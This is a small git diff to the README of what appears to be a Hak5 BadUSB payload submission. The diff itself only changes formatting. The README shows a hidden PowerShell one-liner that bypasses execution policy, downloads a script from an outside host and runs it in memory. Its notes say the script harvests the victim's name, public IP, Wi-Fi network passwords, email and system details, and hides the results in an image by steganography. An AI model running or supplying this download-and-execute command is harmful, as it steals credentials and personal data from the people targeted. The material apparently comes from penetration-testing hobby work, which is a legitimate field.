@@ -1,3 +1,5 @@
+---
+---
 ![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)
 
 <!-- TABLE OF CONTENTS -->
@@ -37,9 +39,9 @@ The generated image will be saved to the desktop and steganography is used to pu
 
 ### Executing program
 
-```
+<pre><code>
 powershell -w h -NoP -NonI -Exec Bypass irm jakoby.lol/zyg | iex
-```
+</code></pre>
 
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
 * Enumerate and get Full Name, Amount of RAM, Public IP, Wifi Password Length, Wifi Networks and Passwords, Day Password was last changed, Email
